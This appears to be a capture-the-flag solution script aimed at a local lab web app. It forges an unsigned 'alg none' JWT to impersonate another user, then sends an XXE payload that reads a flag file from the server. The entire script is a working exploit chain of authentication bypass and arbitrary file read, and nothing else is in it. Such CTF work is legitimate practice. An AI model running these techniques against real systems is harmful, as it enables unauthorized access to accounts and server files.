HOST=http://127.0.0.1:8080
cookie=$(curl -v "$HOST/login" --data-raw 'login=vasya&password=pupkin2026' 2>&1 | grep Set-Cookie | cut -d= -f 2 | cut -d';' -f 1)

ceo_uid=$(curl -L "$HOST/login" --cookie "Authorization=$cookie" --data-raw 'login=vasya&password=pupkin2026' | grep /user/ | cut -d/ -f 3 | cut -d'"' -f 1)

jwt=$(echo -n '{"alg":"none","typ":"JWT"}' | basenc --base64url -w 0 | tr -d =).$(echo -n '{"sub":"'$ceo_uid'","iat":12345,"exp":2147483647}' | basenc -w 0 --base64url | tr -d =).

echo $jwt

curl -L "$HOST/employee/add" --cookie "Authorization=$jwt" | grep vsosh

curl 'http://127.0.0.1:8080/employee/add' -X POST \
  --cookie "Authorization=$jwt" \
  --data-raw 'xml=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%0D%0A%3C%21DOCTYPE+employee+%5B%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fapp%2Fhard_flag.txt%22%3E%0D%0A%5D%3E%0D%0A%3Cemployee%3E%0D%0A++%3Cname%3E%26xxe%3B%3C%2Fname%3E%0D%0A++%3Csurname%3EInjected%3C%2Fsurname%3E%0D%0A++%3Cdepartment%3EBackend%3C%2Fdepartment%3E%0D%0A++%3Csalary%3E1337%3C%2Fsalary%3E%0D%0A%3C%2Femployee%3E' | grep vsosh
